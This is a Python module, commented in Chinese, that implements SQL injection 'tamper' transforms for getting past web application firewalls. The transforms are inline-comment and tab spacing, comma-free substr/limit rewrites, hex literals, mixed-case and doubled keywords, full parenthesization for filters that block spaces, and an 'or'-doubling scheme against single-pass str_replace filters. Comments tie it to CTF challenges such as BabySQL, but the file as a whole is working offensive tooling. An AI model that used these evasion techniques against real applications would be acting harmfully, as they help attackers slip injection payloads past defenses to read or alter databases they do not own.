"""绕过变换（tamper）集合：对 payload 核心片段做 WAF 感知变换。"""
from __future__ import annotations

import re


def space2comment(sql: str) -> str:
    """空格 → 内联注释 /**/（保守起见不替换字符串字面量内部）。"""
    parts, in_str, cur = [], None, ""
    for ch in sql:
        if in_str:
            cur += ch
            if ch == in_str:
                in_str = None
        elif ch in ("'", '"'):
            in_str = ch
            cur += ch
        elif ch == " ":
            parts.append(cur)
            cur = ""
            parts.append("/**/")
        else:
            cur += ch
    parts.append(cur)
    return "".join(parts)


def tabify(sql: str) -> str:
    """空格 → 水平制表符 %09（许多 WAF 只匹配字面空格）。"""
    return sql.replace(" ", "\t")


def comma_free(sql: str) -> str:
    """免逗号变换：substr(x,a,b)→substr(x from a for b)；limit a,b→limit a offset b。"""
    sql = re.sub(r"substr\s*\(\s*([^(),]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
                 r"substr(\1 from \2 for \3)", sql, flags=re.I)
    sql = re.sub(r"mid\s*\(\s*([^(),]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)",
                 r"mid(\1 from \2 for \3)", sql, flags=re.I)
    sql = re.sub(r"limit\s+(\d+)\s*,\s*(\d+)", r"limit \1 offset \2", sql, flags=re.I)
    return sql


def to_hex_literal(s: str) -> str:
    """字符串 → 0x 十六进制字面量（绕过引号过滤）。"""
    return "0x" + s.encode("utf-8").hex()


def mixed_case(sql: str) -> str:
    """关键字大小写混淆（SeLeCt）。"""
    words = ("union", "select", "from", "where", "and", "or", "order", "by",
             "limit", "information_schema", "group_concat", "concat", "substr")
    out = sql
    for w in words:
        mc = "".join(c.upper() if i % 2 else c for i, c in enumerate(w))
        out = re.sub(rf"\b{w}\b", mc, out, flags=re.I)
    return out


def double_write(sql: str) -> str:
    """关键字双写（ selecselectt → select，需后端仅做一次 strip）。"""
    words = ("select", "union", "from", "where", "and", "or")
    out = sql
    for w in words:
        out = re.sub(rf"\b{w}\b", f"{w[:len(w)//2]}{w}{w[len(w)//2:]}", out, flags=re.I)
    return out


# ---------------------------------------------------------------------------
# 括号法（空格与 /**/ 均被过滤时）
# ---------------------------------------------------------------------------

_PAREN_KW = {
    "select", "from", "where", "and", "or", "not", "like", "between", "in",
    "having", "union", "on", "as", "when", "then", "else", "case", "join",
}
# 参数收集的停止词（limit 单独处理，不括号化）
_STOP_KW = _PAREN_KW | {"limit", "offset", "order", "by", "group"}


def _iter_tokens(sql: str):
    """产出 (kind, text)：str/hex/word/sym，跳过字符串与 0x 字面量内容。"""
    i, n = 0, len(sql)
    while i < n:
        ch = sql[i]
        if ch in ("'", '"'):
            j = i + 1
            while j < n and sql[j] != ch:
                j += 1
            yield ("str", sql[i:j + 1])
            i = j + 1
        elif ch == "0" and sql[i:i + 2].lower() == "0x":
            m = re.match(r"0x[0-9a-fA-F]*", sql[i:])
            yield ("hex", m.group(0))
            i += len(m.group(0))
        else:
            m = re.match(r"[A-Za-z_][A-Za-z0-9_]*", sql[i:])
            if m:
                yield ("word", m.group(0))
                i += m.end()
            else:
                yield ("sym", ch)
                i += 1


def parenthesize(sql: str) -> str:
    """空格与 /**/ 均被滤时的括号化（题解验证形式）：
    - union select A,B,C → union(select(A),(B),(C))（多列必须逐列括号）
    - kw arg → kw(arg)（select/from/where/and/or/like/...，任意嵌套深度）
    - LIMIT 无法括号化，调用方应改用 tab 或游标法。
    """
    return _transform_tokens(list(_iter_tokens(sql)))


def _single_group(arg: list) -> bool:
    """arg 是否为单个完整括号组 (...)（中间深度不归零）。"""
    if not arg or arg[0] != ("sym", "(") or arg[-1] != ("sym", ")"):
        return False
    depth = 0
    for kind, text in arg[:-1]:
        if kind == "sym" and text == "(":
            depth += 1
        elif kind == "sym" and text == ")":
            depth -= 1
            if depth == 0:
                return False
    return True


def _transform_tokens(toks) -> str:
    out, i, n = [], 0, len(toks)

    def _collect_arg(pos):
        """收集 kw 的参数 token（保持括号配对），停于下一个顶层关键字或结尾。"""
        arg, depth = [], 0
        while pos < n:
            kind, text = toks[pos]
            if depth == 0 and kind == "word" and text.lower() in _STOP_KW:
                break
            if kind == "sym" and text == "(":
                depth += 1
            elif kind == "sym" and text == ")":
                if depth == 0:
                    break
                depth -= 1
            arg.append((kind, text))
            pos += 1
        return arg, pos

    while i < n:
        kind, text = toks[i]
        if kind == "sym" and text.isspace():
            i += 1                       # paren 形态不允许任何空格残留
            continue
        if kind == "word" and text.lower() == "limit":
            # LIMIT 无法括号化（limit(0,1) 语法错误），用 tab 分隔（需 %09 可用）
            arg, i2 = _collect_arg(i + 1)
            out.append("limit\t" + "".join(t for _, t in arg if not t.isspace()))
            i = i2
            continue
        if kind == "word" and text.lower() in _PAREN_KW:
            kw = text.lower()
            if kw == "select":
                # 列表：顶层逗号拆列，逐列递归变换后括号 select(a),(b),(c)
                i += 1
                cols, cur, depth = [], [], 0
                while i < n:
                    k2, t2 = toks[i]
                    if k2 == "sym" and t2.isspace():
                        i += 1
                        continue
                    if depth == 0 and k2 == "word" and t2.lower() in _STOP_KW:
                        break
                    if k2 == "sym" and t2 == "(":
                        depth += 1
                    elif k2 == "sym" and t2 == ")":
                        if depth == 0:
                            break
                        depth -= 1
                    elif k2 == "sym" and t2 == "," and depth == 0:
                        cols.append(cur)
                        cur = []
                        i += 1
                        continue
                    cur.append((k2, t2))
                    i += 1
                if cur or not cols:
                    cols.append(cur)
                out.append("select" + ",".join(
                    _transform_tokens(c) if c and c[0] == ("sym", "(")
                    else f"({_transform_tokens(c)})"
                    for c in cols))
            elif kw == "union":
                out.append("union(" + _transform_tokens(toks[i + 1:]) + ")")
                i = n
            else:
                arg, i2 = _collect_arg(i + 1)
                if not arg:
                    out.append(kw)
                elif arg[0] == ("sym", "("):
                    # 已自带括号分组（如派生表 (select..)t）——再加层可能不合法
                    out.append(kw + _transform_tokens(arg))
                else:
                    out.append(kw + f"({_transform_tokens(arg)})")
                i = i2
        else:
            out.append(text)
            i += 1
    return "".join(out)


TAMPERS = {
    "space2comment": space2comment,
    "tabify": tabify,
    "parenthesize": parenthesize,
    "comma_free": comma_free,
    "mixed_case": mixed_case,
    "double_write": double_write,
}


def apply_form(core: str, form: str) -> str:
    """按实测命中的 payload 形态变换核心 SQL。"""
    if form in ("paren", "xor", "arith"):
        # arith（减法盲注）：空格必被拦，一切表达式强制括号化无空格
        return parenthesize(core)
    if form == "inline":
        return space2comment(core)
    if form == "tab":
        return tabify(core)
    if form == "orinject":
        return or_inject(core)
    return core


def form_sep(form: str) -> str:
    """数字型（无闭合引号）时 pre 与关键字核心之间的形态分隔符。"""
    return {"classic": " ", "inline": "/**/", "tab": "\t", "paren": "\t",
            "orinject": " ", "xor": "", "arith": ""}.get(form, " ")


# ---------------------------------------------------------------------------
# or 双写（BabySQL 类单次 str_replace 剥离环境）
# ---------------------------------------------------------------------------
_OR_INJECT_KW = (
    "information_schema", "performance_schema", "select", "update",
    "delete", "insert", "drop", "union", "where", "from", "and", "or",
)


def or_inject(sql: str, extra_kws: tuple = ()) -> str:
    """BabySQL 类单次 str_replace 剥离环境的统一保护变换。

    str_replace 会删除**所有**出现的黑名单子串，因此：
    - 含 or 的词（information/performance/password）：所有 or 双写为 oorr
      （删除一处后恰好还原，题解 infoorrmation 验证）；
    - 不含 or 的黑名单关键字（select/union/where/...）：中部插入单个 or
      （seleorct → 剥离 → select）；
    - 要求 or 的剥离发生在其他关键字之后（BabySQL 验证的顺序）。
    extra_kws：运行时由 WAF 报告补充的被剥字母关键字（如 substr/sleep）。
    """
    import re as _re

    def _protect(seg: str) -> str:
        if "or" in seg.lower():
            return _re.sub("or", "oorr", seg, flags=_re.I)
        mid = max(1, len(seg) // 2)
        return seg[:mid] + "or" + seg[mid:]

    kws = set(_OR_INJECT_KW) | {k for k in extra_kws
                                if k and k.replace("_", "").isalpha()}
    low = sql.lower()
    hits, taken = [], []
    for K in sorted(kws, key=len, reverse=True):
        start = 0
        while (idx := low.find(K, start)) != -1:
            s, e = idx, idx + len(K)
            if not any(s < te and ts < e for ts, te in taken):
                taken.append((s, e))
                hits.append((s, e))
            start = idx + 1
    for s, e in sorted(hits, reverse=True):
        sql = sql[:s] + _protect(sql[s:e]) + sql[e:]
    return sql
